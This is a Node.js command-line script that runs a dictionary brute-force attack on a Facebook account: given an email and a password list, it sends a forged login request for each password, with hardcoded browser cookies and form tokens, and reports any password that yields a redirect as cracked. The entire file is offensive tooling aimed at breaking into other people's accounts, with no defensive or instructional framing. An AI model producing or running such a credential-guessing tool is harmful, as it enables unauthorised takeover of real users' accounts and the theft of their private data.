const https = require('https');
const fs = require('fs');
const events = require('events');

const awaitEvent = (emitter, event) =>
  new Promise(
    resolve => emitter.on(event, result => resolve(result))
  );

const facebookRequestHeaders = requestContent => {
  return {
    'Host': 'www.facebook.com',
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Referer': 'https://www.facebook.com/login/',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Cookie': 'fr=06okzS9UDK0hlcALN..BZqxWN.6Z.AAA.0.0.BZqxYp.AWVK8NQ8; _js_reg_fb_ref=https%3A%2F%2Fwww.facebook.com%2Flogin%2F; datr=jRWrWfj-UTohD3BdPBi1RSdm; reg_fb_ref=https%3A%2F%2Fwww.facebook.com%2Flogin.php%3Flogin_attempt%3D1%26lwv%3D120%26lwc%3D1348003; reg_fb_gate=https%3A%2F%2Fwww.facebook.com%2Flogin.php%3Flogin_attempt%3D1%26lwv%3D120%26lwc%3D1348003; wd=1252x592; dpr=1.0909091234207153',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Content-Length': requestContent.length.toString()
  };
};

const facebookRequestContent = ({email, password}) => {
  const contentFields = {
    'lsd': 'AVohXF60',
    'display': '',
    'enable_profile_selector': '',
    'isprivate': '',
    'legacy_return': '0',
    'profile_selector_ids': '',
    'return_session': '',
    'skip_api_login': '',
    'signed_next': '',
    'trynum': '1',
    'timezone': '-120',
    'lgndim': 'eyJ3IjoxMjUyLCJoIjo3MDQsImF3IjoxMjUyLCJhaCI6NjgyLCJjIjoyNH0',
    'lgnrnd': '133553_eCxq',
    'lgnjs': '1504384557',
    'prefill_contact_point': '',
    'prefill_source': '',
    'prefill_type': '',
    'email': email,
    'pass': password
  };

  return encodeContentFields(contentFields);
};

class BruteforceAttack extends events.EventEmitter {
  constructor({email, passwords}) {
    super();
    this.email = email;
    this.passwords = passwords;
  }

  start() {
    return forEachAsync(this.passwords,
      password => this.checkSuccess(password)
    )
    .then(
      () => this.emitExhausted()
    );
  }

  checkSuccess(password) {
    return checkAccountValidity({
      email: this.email,
      password
    })
    .then(
      credentialsValid => {
        if (credentialsValid)
          this.emitSuccess(password);
      }
    );
  }

  emitSuccess(password) {
    this.emit('success', password);
  }

  emitExhausted() {
    this.emit('exhausted');
  }

  registerDefaultCallbacks() {
    this.on('success', password => {
      console.log(`Cracked: ${password}`);
      process.exit(0);
    });

    this.on('exhausted', () => {
      console.log('No match found.');
      process.exit(1);
    });

    return this;
  }
}

const forEachAsync = (arr, asyncFunc) =>
  Promise.all(arr.map(asyncFunc));

const encodeContentFields = contentFields =>
  entries(contentFields)
  .map(([fieldName, fieldValue]) => `${fieldName}=${fieldValue}`)
  .join('&');

const entries = obj => {
  const result = [];
  for (const field in obj)
    result.push([field, obj[field]]);
  return result;
};

const issueFacebookLoginRequest = ({email, password}) => {
  const requestContent = facebookRequestContent({email, password});
  const requestHeaders = facebookRequestHeaders(requestContent);

  const requestOptions = {
    host: 'facebook.com',
    path: '/login.php',
    method: 'POST',
    headers: requestHeaders
  };

  const request = https.request(
    requestOptions
  );
  
  request.end(requestContent);

  return awaitEvent(request, 'response');
};

const checkAccountValidity = ({email, password}) =>
  issueFacebookLoginRequest({email, password})
  .then(
    ({statusCode}) => statusCode === 302
  );

const loadPasswordDictionary = path => {
  const stream = fs.createReadStream(path);
  return getStreamContent(stream)
  .then(
    content => lines(content)
  );
};

const getStreamContent = stringStream => {
  let result = '';
  stringStream.on('data', data => result += data);
  return awaitEvent(stringStream, 'end')
  .then(
    () => result
  );
};

const lines = text => text.split('\n');

if (require.main === module) {

  if (process.argv.length < 4 || process.argv[2] === '--help') {
    const usage = 
      'Usage: node bruteforce-facebook.js <email> <dictionary file>';
    console.log(usage);
    process.exit(0);
  }

  const email = process.argv[2];
  const dictionaryPath = process.argv[3];

  loadPasswordDictionary(dictionaryPath)
  .then(
    passwords => new BruteforceAttack({email, passwords})
  )
  .then(
    bruteforceAttack => bruteforceAttack.registerDefaultCallbacks()
  )
  .then(
    bruteforceAttack => bruteforceAttack.start()
  )
  .catch(
    err => console.log(err)
  );

}
